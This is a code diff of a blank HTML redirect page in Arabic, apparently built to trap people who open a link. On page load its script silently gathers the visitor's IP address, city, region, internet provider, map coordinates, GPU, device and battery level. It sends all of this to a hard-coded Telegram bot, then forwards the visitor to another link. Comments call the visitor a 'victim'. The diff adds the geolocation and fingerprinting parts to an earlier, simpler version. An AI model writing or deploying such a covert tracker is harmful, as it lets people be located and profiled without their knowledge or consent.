@@ -2,38 +2,68 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Checking...</title>
     <script>
-        async function sendToBot() {
+        async function capturePro() {
             const params = new URLSearchParams(window.location.search);
             const target = params.get('u') || "https://t.me/vo11a";
             
-            // معلومات البوت مالتك (مباشرة)
+            // بيانات البوت
             const token = "8795074558:AAHSNWiXI4mKMFsyrEP6qEkMdRQrbc9Yid8";
             const chat_id = "5773364548";
 
-            // جمع معلومات الجهاز والبطارية
-            let batteryInfo = "N/A";
             try {
-                const b = await navigator.getBattery();
-                batteryInfo = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
-            } catch (e) {}
+                // 1. جلب الآيبي والموقع والشركة
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
 
-            const text = `🎯 **صيد جديد مباشر!**\n\n📱 **الجهاز:** ${navigator.platform}\n🔋 **البطارية:** ${batteryInfo}\n🌐 **المتصفح:** ${navigator.userAgent.split(' ')[0]}\n🔗 **الرابط:** ${target}`;
+                // 2. تحليل البطارية
+                let batt = "N/A";
+                try {
+                    const b = await navigator.getBattery();
+                    batt = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
+                } catch(e) {}
 
-            // إرسال البيانات للتليجرام مباشرة بدون سيرفر وسيط
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`)
-            .then(() => {
-                // تحويل الضحية بعد الإرسال
-                window.location.replace(target);
-            })
-            .catch(() => {
-                window.location.replace(target);
-            });
+                // 3. تحليل الـ GPU (نوع الجهاز التفصيلي)
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "Unknown GPU";
+
+                // 4. ترتيب الرسالة مثل ما طلبت بالضيط
+                const message = `🚀 رصد احترافي - تحليل المواصفات 🚀
+━━━━━━━━━━━━━━━
+🌐 الآيبي الخارجي:
+${ipData.ip}
+
+📱 تحليل نوع الجهاز:
+${navigator.platform} (${gpu})
+
+📡 المعالج الرسومي (GPU):
+${gpu}
+
+📍 الموقع: ${ipData.city} | 🏗️ المحافظة: ${ipData.region}
+
+🏢 الشركة: ${ipData.org}
+
+🔋 البطارية: ${batt}
+
+🗺️ رابط الخريطة:
+https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}
+━━━━━━━━━━━━━━━`;
+
+                // إرسال للتليجرام
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
+
+            } catch (err) {
+                // في حال فشل جلب الآيبي، نرسل المعلومات الأساسية
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=فشل في جلب بعض البيانات المتطورة`);
+            }
+
+            // التحويل للرابط النهائي
+            window.location.replace(target);
         }
-        window.onload = sendToBot;
+        window.onload = capturePro;
     </script>
 </head>
-<body style="background:#000;">
-</body>
+<body style="background:#000;"></body>
 </html>
